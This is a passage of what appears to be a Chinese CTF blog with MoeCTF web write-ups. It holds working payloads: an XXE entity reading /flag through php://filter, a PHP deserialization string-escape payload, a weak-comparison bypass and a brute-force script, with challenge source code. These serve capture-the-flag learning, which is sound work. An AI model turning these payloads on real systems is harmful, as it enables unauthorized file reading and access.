<p>这里判断admin相等的是k，利用点就是这里hash加密使用的异或，异或的如果是两个相等的数，那就是0<br>而且使用的是弱比较，gethash用了int，所以数据类型不一样也会转化成int，所以一个username和passwd一个输入数字一个输入字符串就可以了  最后用base64编码5次后的数据传入</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="built_in">echo</span> <span class="string">&#x27;&#123;&quot;username&quot; : &quot;1&quot; , &quot;password&quot; : 1&#125;&#x27;</span> | <span class="built_in">base64</span> | <span class="built_in">base64</span> | <span class="built_in">base64</span> | <span class="built_in">base64</span> | <span class="built_in">base64</span></span><br><span class="line">VjJ4b2MxTXdNVmhVV0d4WFltMTRjRmxzVm1GTlJtUnpWR3R3WVUxRWJIZFZWbVJ6Vkd4VmQySkhO</span><br><span class="line">VlZTVlRWRFdWWmtUMU5HU25WagpSM0JPVFd4SmVWZFVTWGhWYlVaV1lrVldhUXBOYlZKUFZqQlNR</span><br><span class="line">MVJGVG01UVZEQkxDZz09Cg==</span><br></pre></td></tr></table></figure></div>
<p><img src="https://pic1.imgdb.cn/item/67be8722d0e0a243d405d7eb.png"></p>
<h1 id="了解你的座驾"><a href="#了解你的座驾" class="headerlink" title="了解你的座驾"></a>了解你的座驾</h1><p>打开容器，选择XDU moectf Flag  抓包<br><img src="https://pic1.imgdb.cn/item/67bece3dd0e0a243d405f9b9.png"><br>发现包里面用post发送了一个数据，用url解码得到xml格式的内容</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">xml_content</span>=%<span class="number">3</span>Cxml%<span class="number">3</span>E%<span class="number">3</span>Cname%<span class="number">3</span>EXDU+moeCTF+Flag%<span class="number">3</span>C%<span class="number">2</span>Fname%<span class="number">3</span>E%<span class="number">3</span>C%<span class="number">2</span>Fxml%<span class="number">3</span>E</span><br><span class="line"></span><br><span class="line"><span class="comment">#url解码后</span></span><br><span class="line"><span class="attribute">xml_content</span>=&lt;xml&gt;&lt;name&gt;XDU moeCTF Flag&lt;/name&gt;&lt;/xml&gt;</span><br></pre></td></tr></table></figure></div>
<p>所以猜测要用xxe漏洞，xml的文档结构包括xml声明，dtd文档类型定义，以及文件元素 如：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--XML声明--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--DTD，这部分可选的--&gt;</span>          </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [ </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c:/windows/win.ini&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--文档元素--&gt;</span>                                                                          </span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>XXE 漏洞发生在应用程序解析 XML 输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。<br>这里能解析xml代码，我们可以写一个常见的payload，题目又说flag在根目录，所以可以猜测在&#x2F;flag<br>在外部实体里面也可以用php伪协议，这里就用伪协议读取数据<br>payload</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xml</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;/<span class="name">xml</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>这里最后的标签是用户可以随便选的,然后加上原来的<code>&lt;name&gt;</code>，然后要记得把payload做url编码<br><img src="https://pic1.imgdb.cn/item/67bed461d0e0a243d405fe71.png"><br>base64解码得到flag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line">bW9lY3Rme0RvX3kwdV9sMUtlX3RoRS14eGUtVnUxaFU2LXBIUF90MC1nRVRfRklBRy1BZnRFci1nQFNnYXNnYXMwfQo</span><br><span class="line">moectf&#123;Do_y0u_l1Ke_thE-xxe-Vu1hU6-pHP_t0-gET_FIAG-AftEr-<span class="selector-tag">g</span><span class="keyword">@Sgasgas0</span>&#125;</span><br></pre></td></tr></table></figure></div>
<h1 id="出去旅游的心海"><a href="#出去旅游的心海" class="headerlink" title="出去旅游的心海"></a>出去旅游的心海</h1><p>这题因为环境关了，所以没做<br><img src="https://pic1.imgdb.cn/item/67bf311bd0e0a243d40647f3.png"></p>
<h1 id="大海捞针"><a href="#大海捞针" class="headerlink" title="大海捞针"></a>大海捞针</h1><p>题目描述： 该死，之前的平行宇宙由于 flag 的泄露被一股神秘力量抹去，我们脱离了与那个宇宙的连接了！不过不用担心，看起来出题人傻乎乎的是具有泄露 flag 的概率的，我们只需要连接多个平行宇宙…（难道 flag 在多元宇宙里是全局变量吗）</p>
<p><img src="https://pic1.imgdb.cn/item/67bef510d0e0a243d40613c4.png"><br>这里的意思就是flag存在&#x2F;id&#x3D;1 - 1000，当id为特定的值的时候可以得到flag<br>我们就可以写一个简单的脚本爆破出来</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://127.0.0.1:55898/&quot;</span><br><span class="line"><span class="keyword">session</span> = requests.<span class="keyword">session</span>()</span><br><span class="line"></span><br><span class="line">response = <span class="keyword">session</span>.<span class="keyword">get</span>(url)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1001</span>):</span><br><span class="line">    <span class="type">text</span> = response.text</span><br><span class="line">    <span class="keyword">if</span> &quot;moectf&quot; <span class="keyword">in</span> <span class="type">text</span>:</span><br><span class="line">        print (<span class="type">text</span>)</span><br><span class="line">        break;</span><br><span class="line">    response = <span class="keyword">session</span>.<span class="keyword">get</span> (url + &quot;/?id=&quot; + str(i))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p><img src="https://pic1.imgdb.cn/item/67bef77bd0e0a243d40614ff.png"></p>
<h1 id="夺命十三枪"><a href="#夺命十三枪" class="headerlink" title="夺命十三枪"></a>夺命十三枪</h1><p>题目</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;Hanxin.exe.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$Chant</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;chant&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;chant&#x27;</span>] : <span class="string">&#x27;夺命十三枪&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$new_visitor</span> = <span class="keyword">new</span> <span class="title class_">Omg_It_Is_So_Cool_Bring_Me_My_Flag</span>(<span class="variable">$Chant</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$before</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$new_visitor</span>);</span><br><span class="line"><span class="variable">$after</span> = <span class="title class_">Deadly_Thirteen_Spears</span>::<span class="title function_ invoke__">Make_a_Move</span>(<span class="variable">$before</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Movements: &#x27;</span> . <span class="variable">$after</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$after</span>);</span><br><span class="line">&#125;<span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Even Caused A Glitch...&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">Your Movements: O:<span class="number">34</span>:<span class="string">&quot;Omg_It_Is_So_Cool_Bring_Me_My_Flag&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;Chant&quot;</span>;s:<span class="number">15</span>:<span class="string">&quot;夺命十三枪&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;Spear_Owner&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;Nobody&quot;</span>;&#125;</span><br><span class="line">Far away <span class="keyword">from</span> COOL...</span><br></pre></td></tr></table></figure></div>
<p>这里先告诉了另一个源码地址<code>Hanxin.exe.php</code><br>先大致分析一下这个源码，检查有没有从get接受<code>chant</code>参数，然后创建一个类，把序列化之后的结果给<code>$before</code><br>序列化之后，又把这个<code>$before</code>传给<code>Deadly_Thirteen_Spears::Make_a_Move</code>函数<br>最后反序列化这个<code>$after</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>]) === <span class="title function_ invoke__">basename</span>(<span class="keyword">__FILE__</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Deadly_Thirteen_Spears</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$Top_Secret_Long_Spear_Techniques_Manual</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&quot;di_yi_qiang&quot;</span> =&gt; <span class="string">&quot;Lovesickness&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_er_qiang&quot;</span> =&gt; <span class="string">&quot;Heartbreak&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_san_qiang&quot;</span> =&gt; <span class="string">&quot;Blind_Dragon&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_si_qiang&quot;</span> =&gt; <span class="string">&quot;Romantic_charm&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_wu_qiang&quot;</span> =&gt; <span class="string">&quot;Peerless&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_liu_qiang&quot;</span> =&gt; <span class="string">&quot;White_Dragon&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_qi_qiang&quot;</span> =&gt; <span class="string">&quot;Penetrating_Gaze&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_ba_qiang&quot;</span> =&gt; <span class="string">&quot;Kunpeng&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_jiu_qiang&quot;</span> =&gt; <span class="string">&quot;Night_Parade_of_a_Hundred_Ghosts&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_shi_qiang&quot;</span> =&gt; <span class="string">&quot;Overlord&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_shi_yi_qiang&quot;</span> =&gt; <span class="string">&quot;Letting_Go&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_shi_er_qiang&quot;</span> =&gt; <span class="string">&quot;Decisive_Victory&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_shi_san_qiang&quot;</span> =&gt; <span class="string">&quot;Unrepentant_Lethality&quot;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">Make_a_Move</span>(<span class="params"><span class="variable">$move</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="built_in">self</span>::<span class="variable">$Top_Secret_Long_Spear_Techniques_Manual</span> <span class="keyword">as</span> <span class="variable">$index</span> =&gt; <span class="variable">$movement</span>)&#123;</span><br><span class="line">            <span class="variable">$move</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$index</span>, <span class="variable">$movement</span>, <span class="variable">$move</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$move</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Omg_It_Is_So_Cool_Bring_Me_My_Flag</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Chant</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Spear_Owner</span> = <span class="string">&#x27;Nobody&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$chant</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Chant = <span class="variable">$chant</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Spear_Owner = <span class="string">&#x27;Nobody&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;Spear_Owner !== <span class="string">&#x27;MaoLei&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Far away from COOL...&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Omg You&#x27;re So COOOOOL!!! &quot;</span> . <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;FLAG&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>再看看这个<code>Hanxin.exe.php</code><br><code>Deadly_Thirteen_Spears</code>有一个私有数组，这这里存储的是每枪的名字Make_a_Move函数接受一个<code>$move</code>函数，会把里面的第x枪转换成对应的真实名字<br>Omg_It_Is_So_Cool_Bring_Me_My_Flag类接受<code>chant</code>参数，会把<code>$this-&gt;Chant</code>参数赋值成传入的值，最后如果<code>$this -&gt; Spear_Owner</code>是<code>Maolei</code>就是能得到flag</p>
<p>总的来看，Spear_Owner是程序里面确定的，我们能控制的是Chant，所以猜测是用的反序列化字符逃逸，因为还有一个move函数会替换</p>
<p>这里我们先写一个<code>Omg_It_Is_So_Cool_Bring_Me_My_Flag</code>类的随便一个反序列化的结果</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Omg_It_Is_So_Cool_Bring_Me_My_Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Chant</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Spear_Owner</span> = <span class="string">&#x27;Nobody&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$chant</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Chant = <span class="variable">$chant</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Spear_Owner = <span class="string">&#x27;Nobody&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;Spear_Owner !== <span class="string">&#x27;MaoLei&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Far away from COOL...&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Omg You&#x27;re So COOOOOL!!! &quot;</span> . <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;FLAG&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Omg_It_Is_So_Cool_Bring_Me_My_Flag</span>(<span class="string">&quot;di_yi_qiang&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>结果是</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">34</span>:<span class="string">&quot;Omg_It_Is_So_Cool_Bring_Me_My_Flag&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;Chant&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;di_yi_qiang&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;Spear_Owner&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;Nobody&quot;</span>;&#125;</span><br></pre></td></tr></table></figure></div>
<p>我们能控制的就是这里的”di_yi_qiang” 注意到”di_yi_qiang”会被替换成”Lovesickness” 也就是从11个字符替换成了12个字符。<br>这里我简单说一下什么是反序列化的字符逃逸，反序列化中的结构是类似于<code>s:5:&quot;Chant&quot;</code>5代表这个参数的长度，后面跟着参数具体的值，当替换了之后了，比如11个字符替换成了12个字符，而且是在序列化之后进行的替换，这样子参数长度(5)没变，但是参数自己本身的长度因为替换发生了改变，而反序列化看到<code>;&#125;</code>就当作结束了。所以就可以被利用了。我们通过<code>$chant</code>这个参数传入我们想要的序列化的值，然后程序在反序列化时候会提前终止，又因为进行过了替换操作，所以字符长度也会符合条件</p>
<p>现在我们想要的反序列化的值</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">34</span>:<span class="string">&quot;Omg_It_Is_So_Cool_Bring_Me_My_Flag&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;Chant&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;di_yi_qiang&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;Spear_Owner&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;MaoLei&quot;</span>;&#125;</span><br></pre></td></tr></table></figure></div>
<p>那现在能控制的是这里的”di_yi_qiang”,每次替换之后会比之前的字符加1（12-11）<br>我们要构造的</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;;s:11:&quot;</span>Spear_Owne<span class="string">r&quot;;s:6:&quot;</span>MaoLei<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure></div>
<p>一共是35位，所以我们要构造35个”di_yi_qiang”<br>所以参数长度是35 + 35 * 11 &#x3D; 420<br>替换之后就是</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">34</span>:<span class="string">&quot;Omg_It_Is_So_Cool_Bring_Me_My_Flag&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;Chant&quot;</span>;s:<span class="number">420</span>:<span class="number">35</span>个<span class="string">&quot;di_yi_qiang&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;Spear_Owner&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;MaoLei&quot;</span>;&#125;</span><br></pre></td></tr></table></figure></div>
<p>payload</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$post</span> = <span class="string">&#x27;&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;MaoLei&quot;;&#125;&quot;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span> &lt;= <span class="number">35</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$post</span> = <span class="string">&quot;di_yi_qiang&quot;</span>.<span class="variable">$post</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$post</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">di_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiang<span class="string">&quot;;s:11:&quot;</span>Spear_Owner<span class="string">&quot;;s:6:&quot;</span>MaoLei<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>传入url，得到flag<br><img src="https://pic1.imgdb.cn/item/67bf03afd0e0a243d40619ae.png"></p>
<h1 id="彼岸的flag"><a href="#彼岸的flag" class="headerlink" title="彼岸的flag"></a>彼岸的flag</h1><p>题目描述：我们在某个平行宇宙中得到了一段 moectf 群的聊天记录，粗心的出题人在这个聊天平台不小心泄露了自己的 flag<br>根据题目描述，flag就在这个聊天记录里面，查看页面源代码，然后搜索moectf就找到flag<br><img src="https://pic1.imgdb.cn/item/67bf336ed0e0a243d40649bf.png"></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>MoeCTF_2021web</title>
    <url>/posts/51240.html</url>
    <content><![CDATA[<p>MoeCTF_2021web方向WP</p>
<span id="more"></span>
<h1 id="fakegame"><a href="#fakegame" class="headerlink" title="fakegame"></a>fakegame</h1><p><img src="https://pic1.imgdb.cn/item/67b9d4a7d0e0a243d402260a.png"><br>先尝试随便输入一些数，但是都是失败，bp抓包看一下<br><img src="https://pic1.imgdb.cn/item/67b9d5b5d0e0a243d40229fc.png"><br>发现传递数据的方式是这样的，就可能是js中的原型链污染<br>稍微解释一下这个是什么：js中的对象有示例，比如我现在有一个Dog对象，然后我实例创建了一个dog<br>在每个实例对象中会有一个私有的属性<code>__proto__</code>,这个属性指向它的原型，这个原型可以是动物对象，Dog对象继承了一些原型的属性<br>比如eat，sleep，这样子比如我创建一个新的对象Cat，Cat的原型也是动物，这样eat，sleep这些属性就继承就好，不用再重复写<br>在这道题中发现参数传递的方式是js的形式，所以考虑修改原型，因为限制只是针对勇者这个对象的，我们修改原型之后让勇者继承<br><img src="https://pic1.imgdb.cn/item/67b9db08d0e0a243d4022cd9.png"><br>这里我们先修改一些<code>__proto__</code>这个属性，然后发包，发现返回的还是失败，为什么呢？<br>因为原型这个东西是对象刚被创建或者没有赋值的时候才会被对象继承的，我们抓包的时候，第一个勇者对象的生命，攻击这些已经被我们赋值了<br>然后修改了原型的属性，当我们再次发包的时候，因为原型已经被修改了，所以创建的第二个勇者就继承了我们修改了的原型属性<br>变成了开挂勇者，一刀砍死了巨龙，拿到flag</p>
<h1 id="Web-安全入门指北-—POST"><a href="#Web-安全入门指北-—POST" class="headerlink" title="Web 安全入门指北 —POST"></a>Web 安全入门指北 —POST</h1><p><img src="https://pic1.imgdb.cn/item/67b9e22ad0e0a243d4022efe.png"><br>环境坏的，做不了<br>但是看这个题目，估计原题也只要发一个post请求就能解决</p>
<h1 id="Web-安全入门指北-—GET"><a href="#Web-安全入门指北-—GET" class="headerlink" title="Web 安全入门指北 —GET"></a>Web 安全入门指北 —GET</h1><p>题目：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$moe</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;moe&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$moe</span> == <span class="string">&quot;flag&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>http://node5.anna.nssctf.cn:21557/?moe=flag</code></p>
<h1 id="Web-安全入门指北-—-小饼干"><a href="#Web-安全入门指北-—-小饼干" class="headerlink" title="Web 安全入门指北 — 小饼干"></a>Web 安全入门指北 — 小饼干</h1><p><img src="https://pic1.imgdb.cn/item/67b9e2bdd0e0a243d4022f0e.png"><br>这里就是要找关于VIP的东西，可以用bp抓包，我这里直接用curl解决了，加强一下命令使用</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MARKDOWN"><figure class="iseeu highlight /markdown"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# curl http://node5.anna.nssctf.cn:21254/ -v                                                  </span><br><span class="line"><span class="bullet">*</span> Host node5.anna.nssctf.cn:21254 was resolved.</span><br><span class="line"><span class="bullet">*</span> IPv6: (none)</span><br><span class="line"><span class="bullet">*</span> IPv4: 118.195.175.220</span><br><span class="line"><span class="bullet">*</span>   Trying 118.195.175.220:21254...</span><br><span class="line"><span class="bullet">*</span> Connected to node5.anna.nssctf.cn (118.195.175.220) port 21254</span><br><span class="line"><span class="bullet">*</span> using HTTP/1.x</span><br><span class="line"><span class="quote">&gt; GET / HTTP/1.1</span></span><br><span class="line"><span class="quote">&gt; Host: node5.anna.nssctf.cn:21254</span></span><br><span class="line"><span class="quote">&gt; User-Agent: curl/8.11.1</span></span><br><span class="line"><span class="quote">&gt; Accept: <span class="emphasis">*/*</span></span></span><br><span class="line"><span class="quote">&gt; </span></span><br><span class="line"><span class="quote">* Request completely sent off</span></span><br><span class="line">&lt; HTTP/1.1 200 OK</span><br><span class="line">&lt; Date: Sat, 22 Feb 2025 14:45:41 GMT</span><br><span class="line">&lt; Server: Apache/2.4.38 